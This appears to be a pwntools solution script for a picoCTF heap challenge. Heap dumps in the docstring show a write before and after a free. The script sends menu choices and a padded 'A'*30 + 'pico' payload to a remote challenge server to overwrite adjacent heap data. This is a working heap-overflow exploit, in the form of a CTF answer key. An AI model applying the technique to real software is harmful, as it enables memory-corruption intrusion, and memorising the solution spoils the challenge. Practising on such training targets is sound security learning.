#!/bin/python3

"""
------------------HEAP BEFORE FREE AND INPUT------------------------
0x4056a8:       0x0000000000000031      0x0000000000000000
0x4056b8:       0x0000000000000000      0x0000000000000000
0x4056c8:       0x6962000000000000      0x0000000000006f63
0x4056d8:       0x0000000000000411      0x0000000000000000
0x4056e8:       0x0000000000000000      0x0000000000000000
0x4056f8:       0x0000000000000000      0x0000000000000000
0x405708:       0x0000000000000000      0x0000000000000000
0x405718:       0x0000000000000000      0x0000000000000000
0x405728:       0x0000000000000000      0x0000000000000000
0x405738:       0x0000000000000000      0x0000000000000000

------------------HEAP AFTER FREE AND INPUT------------------------
input => "A"*8

0x4056a8:       0x0000000000000031      0x4141414141414141
0x4056b8:       0x0000000000000000      0x0000000000000000
0x4056c8:       0x6962000000000000      0x0000000000006f63
0x4056d8:       0x0000000000000411      0x4141414141414141
0x4056e8:       0x000000000000000a      0x0000000000000000
0x4056f8:       0x0000000000000000      0x0000000000000000
0x405708:       0x0000000000000000      0x0000000000000000
0x405718:       0x0000000000000000      0x0000000000000000
0x405728:       0x0000000000000000      0x0000000000000000
0x405738:       0x0000000000000000      0x0000000000000000
"""

from pwn import *

elf = context.binary = ELF("./chall")
# p = elf.process()
p = remote("tethys.picoctf.net", 57564)

p.sendlineafter(b":", b"5")
p.sendlineafter(b":", b"2")
p.sendlineafter(b":", b"35")
p.sendlineafter(b":", b"A"*30+b"pico")
p.sendlineafter(b":", b"4")

print(p.recvall().decode('latin-1'))
